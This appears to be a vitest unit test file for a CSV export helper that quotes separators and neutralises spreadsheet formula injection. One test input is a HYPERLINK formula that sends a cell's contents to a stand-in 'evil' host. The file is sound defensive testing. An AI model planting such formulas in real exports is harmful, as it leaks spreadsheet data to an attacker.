// CSV export cells (spec 008b): quoting and formula-injection neutralising.
import { describe, expect, it } from "vitest";
import { csvCell } from "../../src/routes/conversations.ts";

describe("csvCell", () => {
  it("leaves plain values alone and quotes separators", () => {
    expect(csvCell("hello")).toBe("hello");
    expect(csvCell(null)).toBe("");
    expect(csvCell(3)).toBe("3");
    expect(csvCell('a, "b"')).toBe('"a, ""b"""');
    expect(csvCell("a\nb")).toBe('"a\nb"');
  });

  it("prefixes values that a spreadsheet would run as a formula", () => {
    expect(csvCell("=1+1")).toBe("'=1+1");
    expect(csvCell("+1")).toBe("'+1");
    expect(csvCell("-2")).toBe("'-2");
    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(csvCell("\tx")).toBe("'\tx");
    expect(csvCell("\rx")).toBe('"\'\rx"');
    expect(csvCell('=HYPERLINK("https://evil/?"&A1,"click")')).toBe(
      '"\'=HYPERLINK(""https://evil/?""&A1,""click"")"',
    );
    expect(csvCell("a=b")).toBe("a=b");
  });
});
